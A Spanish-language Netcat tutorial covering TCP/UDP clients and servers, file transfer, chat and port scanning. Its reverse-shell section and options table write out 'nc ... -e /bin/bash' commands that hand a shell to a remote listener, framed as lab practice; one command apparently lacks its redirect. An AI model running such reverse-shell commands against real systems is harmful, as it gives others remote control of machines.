---
title: Netcat
description: "Cliente/servidor TCP-UDP con `nc`: chat, transferencia, escaneo y shells de práctica."
---

# Netcat en Linux

---

## ¿Qué es Netcat?

**Netcat** (abreviado nc) es una herramienta de línea de comandos usada para:

- Leer y escribir datos en conexiones **TCP o UDP**.
- Crear **clientes y servidores**.
- Transferir archivos, hacer **escucha de puertos**, **chats**, o incluso **backdoors** (de forma ética y controlada).

Es conocida como el **“cuchillo suizo de las redes”**.

---

## Instalación

En la mayoría de sistemas viene preinstalado:

```bash
nc -h
```

Sí no lo tienes:

### Linux (Debian/Ubuntu):

```bash
sudo apt install netcat
```

**Windows:** Puedes usar **Ncat** (parte de Nmap): [https://nmap.org/ncat/](https://nmap.org/ncat/)

---

## Sintaxis general

```bash
nc [opciones] [host] [puerto]
```

---

## Modos principales de uso

## Cliente TCP

Conectarse a un servidor:

```bash
nc 127.0.0.1 8080
```

Esto abre una conexión al puerto 8080 del localhost.

## Servidor TCP

Escuchar conexiones:

```bash
nc -l -p 8080
```

-l → modo escucha

-p → especifica el puerto

Luego, desde otro terminal:

```bash
nc 127.0.0.1 8080
```

Ahora puedes **enviar mensajes entre ambos terminales (chat simple)**.

---

## UDP en lugar de TCP

Para usar **UDP** en vez de TCP:

```bash
# Servidor
nc -u -l -p 6000

# Cliente
nc -u 127.0.0.1 6000
```

-u → activa modo UDP.

---

## Transferencia de archivos

## Enviar un archivo

Servidor que recibirá:

```bash
nc -l -p 5000 > archivo_recibido.txt
```

Cliente que envía:

```bash
nc 127.0.0.1 5000 < archivo.txt
```

El archivo archivo.txt se envía al servidor.

---

## Chat simple entre dos PCs (TCP)

En una máquina:

```bash
nc -l -p 4000
```

En otra:

```bash
nc IP_DEL_SERVIDOR 4000
```

Ahora ambos pueden escribir y leer mensajes.

---

## Escaneo de puertos

Netcat puede escanear qué puertos están abiertos en una máquina:

```bash
nc -zv 192.168.1.10 20-80
```

-z → modo “scan” sin enviar datos.

-v → modo verbose (muestra resultado).

20-80 → rango de puertos.

---

## Redirección de entrada/salida

Puedes usar **pipes** para automatizar tareas:

```bash
echo "Hola servidor" | nc 127.0.0.1 8080
```

O guardar la respuesta:

```bash
nc 127.0.0.1 80  respuesta.txt
```

---

## Reverse Shells (usos éticos y educativos)

Netcat puede crear conexiones remotas tipo **shell inversa**, usadas en **pentesting** (no ilegalmente).

## En el servidor (escuchando)

```bash
nc -l -p 4444 -v
```

## En la víctima (simulada)

```bash
nc 192.168.1.100 4444 -e /bin/bash
```

Esto le da al servidor una consola remota de la otra máquina. _(Solo en entornos controlados o de práctica legal.)_

---

## Otras opciones útiles

| Comando | Qué hace | Ejemplo |
| ------- | -------- | ------- |
| `nc -l -p` | Escucha en un puerto (servidor). | `nc -l -p 8080` |
| `nc -u` | Usa UDP en lugar de TCP. | `nc -u -l -p 6000` |
| `nc -z` | Escaneo sin enviar datos. | `nc -z 192.168.1.10 22` |
| `nc -v` | Salida detallada (verbose). | `nc -zv host 80` |
| `nc -n` | No resuelve DNS (solo IPs). | `nc -nv 10.0.0.1 443` |
| `nc -w` | Timeout en segundos. | `nc -w 3 host 80` |
| `nc -e` | Ejecuta un programa al conectar (si la build lo permite). | `nc -e /bin/bash …` |

---

## Ejemplo práctico completo

## Crear servidor de eco

```bash
# Servidor
nc -l -p 1234 -v
```

## Cliente

```bash
nc 127.0.0.1 1234
```

Ahora cualquier texto que envíes se reflejará entre ambos.

---

## Resumen rápido

| Concepto | Significado |
| -------- | ----------- |
| Cliente | `nc host puerto` — conectar a un servicio. |
| Servidor | `nc -l -p puerto` — escuchar conexiones. |
| UDP | Añadir `-u` en ambos extremos. |
| Archivos | Redirigir con `<` / `>` hacia/desde `nc`. |
| Escaneo | `nc -zv host inicio-fin`. |
| Shell inversa | Solo en labs autorizados; muchas distros desactivan `-e`. |

---

## Alternativas modernas

- **Ncat** (de Nmap): versión más segura y moderna.
- **Socat**: similar pero con más opciones.
- **PowerCat** (en Windows PowerShell): equivalente en sistemas modernos.
